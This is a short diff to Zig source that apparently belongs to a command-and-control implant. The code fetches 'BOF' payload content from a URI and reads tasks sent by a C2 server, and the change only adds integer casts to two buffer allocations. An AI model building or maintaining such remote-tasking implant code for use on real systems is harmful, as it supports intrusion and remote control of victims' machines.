@@ -42,7 +42,7 @@ fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]u8 {
         return error.sdfsdfs;
     }
 
-    const bof_content = try allocator.alloc(u8, bof_req.response.content_length.?);
+    const bof_content = try allocator.alloc(u8, @intCast(bof_req.response.content_length.?));
     errdefer allocator.free(bof_content);
 
     _ = try bof_req.readAll(bof_content);
@@ -106,7 +106,7 @@ pub fn main() !u8 {
 
         // task received from C2?
         if (std.ascii.eqlIgnoreCase(content_type, "application/json")) {
-            const resp_content = try allocator.alloc(u8, req.response.content_length.?);
+            const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
             defer allocator.free(resp_content);
             _ = try req.readAll(resp_content);
 
